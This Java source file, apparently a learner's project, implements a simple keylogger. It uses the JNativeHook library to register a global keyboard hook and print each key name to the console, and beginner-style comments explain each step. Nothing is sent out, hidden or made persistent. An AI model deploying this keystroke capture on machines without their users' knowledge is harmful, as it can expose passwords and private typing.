package KeyboardBug;
// see main.java for reason

import com.github.kwhat.jnativehook.NativeHookException; // these are all from the necessary keylogger package
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
// these import the "kwhat" package, which I found was necessary to make a keylogger, and allow for jnativehook to function. 
// In order for these to work, I had to add jnativehook jar files for recognition (they can be seen in "libs" folder)

// similar to inheritance in class, I needed implement "NativeKeyListener" in order to record activity from the keyboard.
public class KeyboardBugger implements NativeKeyListener {
	
	
	// this allows the program to record the keys pressed by figuring out the output from the ".getKeyTest" method.
	public void recordKey(NativeKeyEvent record) {
			
		// the type of recording keys in "kwhat" package can only return the "original key"
		// ex: shift + 5 will not return "%", it returns "5" (cant return the second function of the key)
		System.out.println("Log: " + NativeKeyEvent.getKeyText(record.getKeyCode()));

	}

	public void Listen() {
		try { 									// (try statement tests for errors. catch statement is executed when an error occurs in the try statement)
			GlobalScreen.registerNativeHook();
			
		} catch (NativeHookException error) {
			
		// i am testing to register the nativehook, which needs to be "on" in order for the keylogger to work.
			
			System.out.println("Something went wrong...");
			System.exit(0);
		}

		// refers to the "GlobalScreen" and adds NativeKeyListener method to record events from keyboard.
		GlobalScreen.addNativeKeyListener(this); // method
		
		/* "kwhat" system works like this: 
	 	
	 	if no action is performed, the listener is null (not recording anything)
	 	if an action is performed, the listener receives the input (recording the input from keyboard with output from object; explained below)
		 */
		
	}
	
	
}
